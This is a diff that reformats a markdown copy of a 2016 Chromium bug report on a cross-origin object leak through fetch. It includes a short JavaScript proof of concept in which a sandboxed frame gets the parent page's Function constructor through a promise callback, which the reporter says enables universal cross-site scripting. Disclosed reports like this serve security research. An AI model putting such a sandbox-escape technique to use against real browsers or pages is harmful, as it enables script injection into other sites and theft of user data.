@@ -1,4 +1,5 @@
 # Cross-origin object leak via fetch
+
 ### Reported by pim...@live.nl, Oct 15 2016
 
 VULNERABILITY DETAILS
@@ -11,12 +12,9 @@ Operating System: Windows 10
 REPRODUCTION CASE
 See attachments. Save in the same directory, then open parent.html. The sandboxed child is able to call `Function.foo` of the parent page.
 
-https://bugs.chromium.org/p/chromium/issues/detail?id=656274
-
-> Next comment:
-
 In fact, I found a way to bypass the function constructor restrictions. That is, UXSS is possible. The trick is to create and resolve a promise, and call the function constructor in the `then` callback:
-```
+
+```js
   var parent_Promise = fetch.call(parent).constructor;
   var parent_Function = parent_Promise.constructor;
   new parent_Promise(function(resolve) {
@@ -26,3 +24,5 @@ In fact, I found a way to bypass the function constructor restrictions. That is,
     f();
   });
 ```
+
+Link: https://bugs.chromium.org/p/chromium/issues/detail?id=656274
